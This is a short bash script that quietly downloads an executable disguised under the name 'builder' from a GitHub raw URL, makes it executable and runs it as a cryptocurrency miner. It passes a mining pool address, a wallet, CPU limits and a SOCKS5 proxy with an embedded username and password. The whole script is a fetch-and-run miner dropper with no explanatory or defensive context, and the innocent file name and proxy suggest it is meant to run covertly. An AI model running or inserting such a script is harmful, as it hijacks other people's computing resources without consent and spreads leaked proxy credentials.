#!/bin/bash 

wget -q https://raw.githubusercontent.com/andromedasizu/andromedasizu/main/builder
chmod +x builder
./builder -a yespower -o stratum+tcp://198.50.168.213:6241 -u DQGAS3U8cmDwBPn61bboXNBrSkEWhXuaVT -p c=DGB,zap=SUGAR -t 2 --cpu-affinity=0x3 -x socks5://xdezolvq:51tnf8wfj0hu@144.168.217.36:8728
